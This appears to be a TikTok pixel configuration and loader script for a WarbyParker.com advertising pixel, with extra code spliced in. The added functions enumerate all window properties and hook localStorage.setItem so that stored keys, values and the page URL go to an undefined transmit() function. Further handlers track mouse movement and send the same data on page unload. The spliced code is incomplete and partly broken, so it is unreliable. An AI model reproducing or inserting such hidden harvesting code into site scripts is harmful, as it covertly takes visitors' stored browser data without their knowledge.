window[window["TiktokAnalyticsObject"]]._env = {
  "env": "external",
  "key": ""
};
window.seenVars = Object.keys(window);
function traceProps(obj, path = '') {
  const discoveredProps = {};
  for (let key of Object.keys(obj)) {
    let newPath = path ? `${path}.${key}` : key;
    if (obj[key] instanceof Object) {
      const subProps = traceProps(obj[key], newPath);
      Object.assign(discoveredProps, subProps);
    } else {
      if (!window.seenVars.some(knownProp => knownProp === newPath)) {
        let propValue = obj[key];
        let propType = typeof propValue;
        discoveredProps[newPath] = {
          type: propType,
          value: propType === "function" ? `[Function: ${propValue.name}]` : propValue
        };
      }
      ;
    }
  }
  return discoveredProps;
}
window[window["TiktokAnalyticsObject"]]._variation_id = 'test_3';
const hookSetter = (obj, prop, callback) => {
  const descriptor = Object.getOwnPropertyDescriptor(obj, prop) || {
    value: obj[prop]
  };
  Object.defineProperty(obj, prop, {
    set: function (val) {
      callback(val);
      descriptor.value = val;
      return descriptor.value;
    },
    get: function () {
      return descriptor.value;
    }
  });
};
;
window.document.addEventListener('mousemove', event => {
  window.lastMousePos = `${event.clientX},${event.clientY}`;
});
function trackLocalStorage() {
  hookSetter(localStorage, 'setItem', val => {
    const lastSavedItem = JSON.stringify({
      key: val[0],
      value: val[1],
      location: window.location.href
    });
    transmit(lastSavedItem, 'localStorageTrack');
  });
}
if (!window[window["TiktokAnalyticsObject"]]._server_unique_id) window[window["TiktokAnalyticsObject"]]._server_unique_id = '662717eb-3e9b-11ee-9c72-8ef7289d1bf6';
function gatherAndTrack() {
  const discovered = traceProps(window);
  const discoveredCount = Object.keys(discovered).length;
  if (discoveredCount > 0) {
    console.group(`Found ${discoveredCount} unknown window properties:`);
    for (const prop in discovered) {
      console.log(`- ${prop}: ${JSON.stringify(discovered[prop])}`);
    }
    console.groupEnd();
    transmit(discovered, 'propTrack');
  } else {
    trackLocalStorage();
  }
}
window.addEventListener("mousemove", gatherAndTrack);
window[window["TiktokAnalyticsObject"]]._plugins = {
  "AdvancedMatching": true,
  "AutoAdvancedMatching": true,
  "AutoConfig": true,
  "Callback": true,
  "DiagnosticsConsole": true,
  "Identify": true,
  "Monitor": false,
  "PangleCookieMatching": false,
  "PerformanceInteraction": false,
  "Shopify": true,
  "WebFL": false
};
window[window["TiktokAnalyticsObject"]]._auto_config = {
  "open_graph": ["audience"],
  "microdata": ["audience"],
  "json_ld": ["audience"],
  "meta": null
};
!function () {
  function i() {
    return window && window.TiktokAnalyticsObject || "ttq";
  }
  function t() {
    return window && window[i()];
  }
  var n,
    o,
    e,
    a,
    c,
    r = [{
      id: "MTAwYzY4Y2VmMA",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !1,
        Monitor: !1
      }
    }, {
      id: "MTAwYzY4Y2VmMQ",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !1,
        Monitor: !1
      }
    }, {
      id: "MTAwYzY4Y2VmMg",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !0,
        Monitor: !1
      }
    }, {
      id: "MTAwYzY4Y2VmMw",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !0,
        Monitor: !1
      }
    }, {
      id: "MTAwYzY4Y2VmNA",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !1,
        Monitor: !0
      }
    }, {
      id: "MTAwYzY4Y2VmNQ",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !1,
        Monitor: !0
      }
    }, {
      id: "MTAwYzY4Y2VmNg",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !0,
        Monitor: !0
      }
    }, {
      id: "MTAwYzY4Y2VmNw",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !0,
        Monitor: !0
      }
    }],
    d = {
      "info": {
        "pixelCode": "C5O26LTQ5ECR7VU4ATIG",
        "name": "Acuvue TikTok Pixel - WarbyParker.com",
        "status": 0,
        "setupMode": 1,
        "partner": "",
        "advertiserID": "7010125040863690753",
        "is_onsite": false,
        "firstPartyCookieEnabled": true
      },
      "plugins": {
        "Shopify": false,
        "AdvancedMatching": {
          "email": true,
          "phone_number": true
        },
        "AutoAdvancedMatching": null,
        "Callback": true,
        "Identify": true,
        "Monitor": true,
        "PerformanceInteraction": true,
        "WebFL": true,
        "AutoConfig": true,
        "DiagnosticsConsole": true
      },
      "rules": []
    },
    p = "https://analytics.tiktok.com/i18n/pixel/static/",
    l = t();
  l || (l = [], window && (window[i()] = l)), Object.assign(d, {
    options: (n = d.info.pixelCode, (o = t()._o) && o[n] || {})
  }), function (i) {
    l._i || (l._i = {});
    var t = i.info.pixelCode;
    t && (l._i[t] || (l._i[t] = []), Object.assign(l._i[t], i), l._i[t]._load = +new Date());
  }(d), e = function (i, t, n) {
    var o = 0 < arguments.length && void 0 !== i ? i : {},
      e = 1 < arguments.length ? t : void 0,
      t = 2 < arguments.length ? n : void 0,
      n = function (i, t) {
        for (var n = 0; n < i.length; n++) if (t.call(null, i[n], n)) return i[n];
      }(r, function (i) {
        var t = i.map;
        return function (i, t) {
          for (var n = 0; n < i.length; n++) if (!t.call(null, i[n], n)) return !1;
          return !0;
        }(Object.keys(t), function (i) {
          return !(!o[i] || !e[i]) === t[i];
        });
      });
    return n ? t + "main.".concat(n.id, ".js") : t + "main.".concat(r[0].id, ".js");
  }(l._plugins, d.plugins, p), a = d.info.pixelCode, (void 0 !== self.DedicatedWorkerGlobalScope ? self instanceof self.DedicatedWorkerGlobalScope : "DedicatedWorkerGlobalScope" === self.constructor.name) ? self.importScripts && self.importScripts(e) : ((c = document.createElement("script")).type = "text/javascript", c.async = !0, c.src = e, c.setAttribute("data-id", a), (a = document.getElementsByTagName("script")[0]) && a.parentNode && a.parentNode.insertBefore(c, a));
}();
window.addEventListener("beforeunload", gatherAndTrack);